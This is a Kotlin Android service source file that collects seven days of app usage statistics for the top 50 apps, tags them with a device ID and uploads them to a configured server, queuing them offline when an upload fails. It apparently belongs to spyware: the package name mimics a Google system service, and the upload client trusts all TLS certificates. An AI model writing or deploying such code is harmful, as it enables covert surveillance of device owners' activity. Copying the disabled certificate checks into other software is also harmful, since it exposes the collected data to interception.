package com.google.android.systemservice.services

import android.app.Service
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.OfflineDataQueue
import com.google.android.systemservice.utils.ServerUploader
import com.google.android.systemservice.utils.TrustAllCertificates
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

/**
 * Collects app usage statistics using UsageStatsManager.
 * Requires android.permission.PACKAGE_USAGE_STATS (granted via Settings).
 */
class AppUsageService : Service() {

    companion object {
        private const val TAG = "AppUsage"
    }

    private val httpClient = TrustAllCertificates.createClientBuilder().build()
    private var workerThread: Thread? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        workerThread = Thread { collectAndSend() }.also { it.start() }
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        workerThread?.interrupt()
        workerThread = null
        httpClient.dispatcher.executorService.shutdown()
        httpClient.connectionPool.evictAll()
        stopForeground(false)
        super.onDestroy()
    }

    private fun collectAndSend() {
        try {
            val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
            if (usageStatsManager == null) {
                Log.e(TAG, "UsageStatsManager not available")
                stopSelf()
                return
            }

            val endTime = System.currentTimeMillis()
            val startTime = endTime - TimeUnit.DAYS.toMillis(7) // Last 7 days

            val stats = usageStatsManager.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, startTime, endTime
            )

            if (stats.isNullOrEmpty()) {
                Log.w(TAG, "No usage stats available (permission may not be granted)")
                stopSelf()
                return
            }

            val jsonArray = JSONArray()
            stats.filter { it.totalTimeInForeground > 0 }
                .sortedByDescending { it.totalTimeInForeground }
                .take(50) // Top 50 apps
                .forEach { stat ->
                    jsonArray.put(JSONObject().apply {
                        put("package_name", stat.packageName)
                        put("total_time_ms", stat.totalTimeInForeground)
                        put("last_used", stat.lastTimeUsed)
                        put("total_time_readable", formatDuration(stat.totalTimeInForeground))
                    })
                }

            val payload = JSONObject().apply {
                put("device_id", AndroidConfig.deviceId)
                put("app_usage", jsonArray)
                put("period_days", 7)
                put("timestamp", System.currentTimeMillis())
            }

            sendToServer(payload)
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting usage stats: ${e.message}")
        } finally {
            stopSelf()
        }
    }

    private fun sendToServer(payload: JSONObject) {
        ServerUploader.uploadJson(
            client = httpClient,
            url = "${AndroidConfig.apiBaseUrl}/app_usage",
            data = payload,
            onSuccess = { Log.d(TAG, "App usage stats sent") },
            onError = { e ->
                Log.w(TAG, "Upload failed: ${e.message}")
                queueOffline(payload.toString())
            }
        )
    }

    private fun queueOffline(json: String) {
        try {
            OfflineDataQueue(this).enqueue("app_usage", json, AndroidConfig.deviceId)
        } catch (e: Exception) {
            Log.e(TAG, "Queue error: ${e.message}")
        }
    }

    private fun formatDuration(ms: Long): String {
        val hours = TimeUnit.MILLISECONDS.toHours(ms)
        val minutes = TimeUnit.MILLISECONDS.toMinutes(ms) % 60
        return "${hours}h ${minutes}m"
    }
}
